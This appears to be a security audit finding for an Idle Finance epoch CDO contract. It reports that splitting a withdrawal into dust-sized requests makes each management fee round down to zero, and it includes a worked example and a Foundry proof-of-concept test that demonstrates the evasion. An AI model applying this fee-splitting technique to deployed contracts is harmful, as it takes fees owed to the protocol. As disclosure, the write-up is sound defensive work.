### Title
Precision loss lets chunked withdrawal requests evade upfront management fees - (File: `contracts/IdleCDOEpochVariant.sol`)

### Summary
`requestWithdraw` calculates management and performance fees independently for every withdrawal request, allowing a tranche holder to split one withdrawal into many dust-sized requests whose fees round down to zero while the credit vault aggregates all resulting receipts. [1](#0-0) [2](#0-1) 

### Finding Description
For each request, `requestWithdraw` converts the selected tranche amount into `principal`, calculates projected interest, subtracts `_totalWithdrawFees`, and adds that independently rounded fee to `pendingWithdrawFees`. [1](#0-0)  `_totalWithdrawFees` begins with `_calculateManagementFee(_principal, duration)`, while `_calculateManagementFee` floors `principal * managementFee * duration / 3_153_600_000_000`. [3](#0-2) [4](#0-3) 

Consequently, a request is fee-free whenever:

```solidity
principal * managementFee * duration < 3_153_600_000_000
```

`IdleCreditVault.requestWithdraw` has no minimum and simply accumulates repeated requests for the same user and epoch through `withdrawsRequests[_user] += _amount` and `withdrawsRequestsByEpoch[_user][epoch] += _amount`. [5](#0-4) 

For example, with a 1% management fee (`managementFee = 1000`) and a 35-day receipt-fee duration, every request with principal not exceeding approximately `1042` underlying units produces zero upfront management fee, while 100 requests of `1000` units each also produce zero despite a consolidated request of `100000` units owing approximately `95` units. The only prerequisites are that withdrawal requests are enabled for the tranche and the attacker is an allowed tranche holder, which are the same conditions required for an ordinary `requestWithdraw`. [6](#0-5) [7](#0-6) 

### Impact Explanation
A lender can evade the upfront management fee on an arbitrarily large withdrawal by partitioning it into enough dust requests. [8](#0-7)  The protocol’s configured-fee invariant is broken because `pendingWithdrawFees` remains zero even though the aggregate withdrawal basis would produce a nonzero fee. [8](#0-7) 

The quantifiable loss is the difference between the fee calculated on the aggregate principal and the sum of the independently floored fees; with the example parameters above, the expected loss is approximately `95` USDC base units per `100000` base units withdrawn, and larger positions scale proportionally.

### Likelihood Explanation
Likelihood is low to moderate: exploitation requires many transactions because each request must remain below the fee threshold, making the attack primarily relevant when fees are material relative to transaction costs or when automation makes the fragmentation inexpensive. The code nevertheless imposes no minimum request size or limit on repeated same-epoch requests, and neither KYC checks, skim handling, nor epoch accounting prevents aggregation of zero-fee receipts. [9](#0-8) [5](#0-4) 

### Recommendation
Calculate withdrawal fees on the user’s cumulative request basis rather than independently on each request. Track cumulative principal and projected interest per user and epoch, then charge the incremental fee as `fee(newCumulativeBasis) - fee(previousCumulativeBasis)`; alternatively, enforce a nonzero minimum fee whenever the configured fee and principal are nonzero.

### Proof of Concept
The following test can be added to `test/foundry/IdleCreditVault.t.sol`, which already forks mainnet and deploys the epoch CDO and credit vault used by the assertions:

```solidity
function testRequestWithdrawSplittingRoundsManagementFeeToZero() external {
    uint256 mgmtFeeRate = 1_000; // 1%
    uint256 requests = 10;

    _setFeeParams(TL_MULTISIG, 0, FULL_ALLOC, cdoEpoch.managementFee());
    _setManagementFee(mgmtFeeRate);

    uint256 trancheAmount = idleCDO.depositAA(10_000 * ONE_SCALE);
    _transferBurnedTrancheTokens(address(this), true);

    uint256 duration = _withdrawRequestManagementFeeDuration();
    uint256 price = cdoEpoch.tranchePrice(address(AAtranche));

    // Largest principal whose production management fee still truncates to zero.
    uint256 feeFreePrincipal =
        3_153_600_000_000 / (mgmtFeeRate * duration);

    // Convert that principal cap back to a whole tranche amount.
    uint256 chunkTranches =
        feeFreePrincipal * ONE_TRANCHE_TOKEN / price;
    uint256 chunkPrincipal =
        chunkTranches * price / ONE_TRANCHE_TOKEN;

    assertGt(chunkTranches, 0, "fee-free chunk too small");
    assertLt(chunkTranches * requests, trancheAmount, "deposit too small");

    uint256 dustFee =
        chunkPrincipal * mgmtFeeRate * duration / 3_153_600_000_000;
    uint256 aggregateFee =
        chunkPrincipal * requests * mgmtFeeRate * duration /
        3_153_600_000_000;

    assertEq(dustFee, 0, "chunk should pay zero fee");
    assertGt(aggregateFee, 0, "aggregate request should owe a fee");

    uint256 requested;
    for (uint256 i; i < requests; ++i) {
        requested += cdoEpoch.requestWithdraw(
            chunkTranches,
            address(AAtranche)
        );
    }

    assertEq(
        cdoEpoch.pendingWithdrawFees(),
        0,
        "split requests evaded the aggregate fee"
    );
    assertEq(
        IdleCreditVault(address(strategy)).pendingWithdraws(),
        requested,
        "all fee-free receipts were aggregated"
    );
}
```

Running this as a mainnet-fork Foundry test demonstrates that `pendingWithdrawFees` remains zero even though applying the same production formula once to the aggregate principal produces a nonzero fee.
